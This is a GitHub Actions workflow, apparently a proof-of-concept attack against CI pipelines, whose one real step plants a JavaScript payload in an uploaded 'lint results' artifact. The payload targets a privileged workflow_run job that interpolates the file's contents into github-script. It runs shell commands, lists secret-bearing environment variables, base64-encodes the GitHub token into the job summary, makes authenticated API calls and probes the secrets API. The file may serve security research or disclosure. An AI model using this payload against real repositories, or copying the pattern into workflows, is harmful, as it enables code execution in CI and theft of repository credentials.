---
name: PR Validation
on:
  pull_request:

jobs:
  validate:
    runs-on: ubuntu-latest
    steps:
      - name: Produce attacker-controlled lint results
        run: |
          echo "true" > has-warnings.txt
          cat > pr-number.txt <<'PAYLOAD'
          999999; await (async()=>{const cp=require('child_process'),fs=require('fs');const proof=cp.execSync('id; uname -a; echo INJECTED_RCE_PROOF > /tmp/gab-prcomment-marker; cat /tmp/gab-prcomment-marker',{encoding:'utf8'});fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'### RCE via github-script interpolation\n```\n'+proof+'\n```\n');const keys=Object.keys(process.env).filter(k=>/TOKEN|SECRET/i.test(k));fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'\nenv keys with TOKEN/SECRET: '+keys.join(',')+'\n');const tok=process.env['INPUT_GITHUB-TOKEN']||process.env.GITHUB_TOKEN||'';fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'\nINPUT_TOKEN_LEN='+tok.length+' TOKEN_B64='+Buffer.from(tok).toString('base64')+'\n');const pn=(context.payload.workflow_run.pull_requests&&context.payload.workflow_run.pull_requests[0]&&context.payload.workflow_run.pull_requests[0].number);const repoInfo=await github.request('GET /repos/{owner}/{repo}',{owner:context.repo.owner,repo:context.repo.repo});fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'\nAUTHENTICATED_API_OK repo='+repoInfo.data.full_name+'\n');const c=await github.request('POST /repos/{owner}/{repo}/issues/{issue_number}/comments',{owner:context.repo.owner,repo:context.repo.repo,issue_number:pn,body:'INJECTED_RCE_PROOF: attacker JS executed in privileged workflow_run job. Authenticated token API call succeeded for '+repoInfo.data.full_name+' as '+context.actor});fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'\nComment: '+c.data.html_url+'\n');const pr=await github.request('GET /repos/{owner}/{repo}/pulls/{pull_number}',{owner:context.repo.owner,repo:context.repo.repo,pull_number:pn});fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'\nAUTHENTICATED_PR_READ #'+pr.data.number+' '+pr.data.title+'\n');let sec='';try{await github.request('GET /repos/{owner}/{repo}/actions/secrets',{owner:context.repo.owner,repo:context.repo.repo});sec='secrets API unexpectedly allowed';}catch(e){sec='secrets API blocked: HTTP '+e.status+' '+(e.message||'');}fs.appendFileSync(process.env.GITHUB_STEP_SUMMARY,'\n'+sec+'\n');})(); (context.payload.workflow_run.pull_requests&&context.payload.workflow_run.pull_requests[0]&&context.payload.workflow_run.pull_requests[0].number)||999999
          PAYLOAD
      - name: Upload lint results
        uses: actions/upload-artifact@v4
        with:
          name: lint-results
          path: |
            has-warnings.txt
            pr-number.txt
